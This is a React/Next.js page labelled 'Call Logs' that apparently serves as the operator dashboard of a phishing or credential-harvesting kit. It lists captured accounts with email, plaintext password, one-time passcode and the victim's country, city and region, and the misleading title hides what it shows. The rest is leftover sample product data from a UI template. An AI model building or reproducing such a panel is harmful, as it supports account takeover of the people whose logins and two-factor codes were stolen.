"use client";
import Seo from "@/shared/layout-components/seo/seo";
import Link from "next/link";
import React, { Fragment, useEffect } from "react";
import { Button, Card, Col, Dropdown, Pagination, Row } from "react-bootstrap";
import { getAccounts } from "@/shared/Api/dashboard";
import { useDispatch, useSelector } from "react-redux";
function CallLogsPage() {
  const dispatch = useDispatch();
  const user = useSelector((state: any) => state.auth.user);
  const accounts = useSelector((state: any) => state.dash.accounts);
  useEffect(() => {
    console.log("accounts in here", accounts);
    getAccounts(user?._id, dispatch);
  }, []);
  const products = [
    {
      id: 1,
      productName: "Flower Pot",
      brand: "Accusam Brand",
      category: "Furniture",
      status: "Pending",
      customerName: "Mayor Kelly",
      customerEmail: "mayorkelly213@gmail.com",
      qty: 6,
      dateOrdered: "03 Sep 2024",
      totalSales: 10,
      price: "$15,000",
      imageUrl: "../../assets/images/ecommerce/jpg/1.jpg",
    },
    {
      id: 2,
      productName: "Head Phones",
      brand: "Vellintn Brand",
      category: "Electronics",
      status: "Processing",
      customerName: "Andrew Garfield",
      customerEmail: "andrewgarfield1994@gmail.com",
      qty: 1,
      dateOrdered: "05 Oct 2024",
      totalSales: 20,
      price: "$25,000",
      imageUrl: "../../assets/images/ecommerce/jpg/2.jpg",
    },
    // Add more products as needed...
  ];
  return (
    <Fragment>
      <Seo title={"Call-logs"} />
      <Row>
        <Col xl={12}>
          <Card className="custom-card">
            <Card.Header className="justify-content-between">
              <Card.Title>Call Logs</Card.Title>
              <div className="d-flex flex-wrap gap-2">
                <div>
                  <input
                    className="form-control form-control-sm"
                    type="text"
                    placeholder="Search Here"
                    aria-label=".form-control-sm example"
                  />
                </div>
              </div>
            </Card.Header>
            <Card.Body className="p-0">
              <div className="table-responsive">
                <table className="table text-nowrap">
                  <thead>
                    <tr>
                      {/* <th scope="row" className="ps-4">
                        <input
                          className="form-check-input"
                          type="checkbox"
                          aria-label="..."
                        />
                      </th> */}
                      <th>Email</th>
                      <th>Password</th>
                      <th>Otp</th>
                      <th>Browser</th>
                      <th>Country</th>
                      <th>City</th>
                      <th>State</th>
                      {/* <th>Action</th> */}
                    </tr>
                  </thead>
                  <tbody>
                    {accounts.map((account: any) => (
                      <tr key={account._id}>
                        {/* <td className="ps-4">
                          <input
                            className="form-check-input"
                            type="checkbox"
                            aria-label="..."
                          />
                        </td> */}
                        <td>
                          <div className="d-flex">
                            <div className="ms-2">
                              <p className="fs-12 text-muted mb-0">
                                {account.email}
                              </p>
                            </div>
                          </div>
                        </td>
                        <td>{account.password}</td>
                        <td>
                          <span
                            className={`badge bg-${account?.status?.toLowerCase()}-transparent`}
                          >
                            {account.otp}
                          </span>
                        </td>
                        <td>
                          <span className="fw-semibold fs-13">
                            {"browser info"}
                          </span>
                          <span className="d-block text-muted fs-12">
                            {account?.location?.country}
                          </span>
                        </td>
                        <td>{account?.location?.country}</td>
                        <td>{account?.location?.city}</td>
                        <td>{account?.location?.region}</td>
                        {/* <td>
                          <div className="btn-list">
                            <Button
                              variant=""
                              className="btn btn-sm btn-icon btn-primary-light btn-wave"
                            >
                              <i className="ri-eye-line"></i>
                            </Button>
                            <Button
                              variant=""
                              className="btn btn-sm btn-icon btn-secondary-light btn-wave"
                            >
                              <i className="ri-edit-line"></i>
                            </Button>
                          </div>
                        </td> */}
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </Card.Body>
            <Card.Footer>
              <div className="d-flex align-items-center">
                <div>
                  {" "}
                  Showing 6 Entries{" "}
                  <i className="bi bi-arrow-right ms-2 fw-semibold"></i>{" "}
                </div>
                <div className="ms-auto">
                  <nav
                    aria-label="Page navigation"
                    className="pagination-style-4"
                  >
                    <Pagination className="pagination mb-0">
                      <Pagination.Item disabled> Prev </Pagination.Item>
                      <Pagination.Item active>1</Pagination.Item>
                      <Pagination.Item>2</Pagination.Item>
                      <Pagination.Item className="pagination-next">
                        next{" "}
                      </Pagination.Item>
                    </Pagination>
                  </nav>
                </div>
              </div>
            </Card.Footer>
          </Card>
        </Col>
      </Row>
    </Fragment>
  );
}

export default CallLogsPage;
